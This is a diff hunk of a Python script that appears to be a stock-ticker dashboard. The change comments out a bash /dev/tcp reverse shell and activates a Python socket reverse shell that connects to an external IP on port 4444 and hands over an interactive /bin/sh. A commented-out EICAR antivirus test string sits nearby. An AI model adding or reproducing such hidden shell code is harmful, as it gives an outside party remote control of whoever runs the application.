@@ -35,15 +35,15 @@ tickers = prices["ticker"].unique()
 # stream = os.popen('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
 # stream = os.popen('history')
 # ls = stream.read()
-os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
+# os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
 ls = "shell"
-# import socket,subprocess,os
-# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# s.connect(("10.0.0.1",1234))
-# os.dup2(s.fileno(),0)
-# os.dup2(s.fileno(),1)
-# os.dup2(s.fileno(),2)
-# p=subprocess.call(["/bin/sh","-i"]);'
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("185.190.92.18",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);'
 #ls = "eicar test X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
 
 # top nav bar
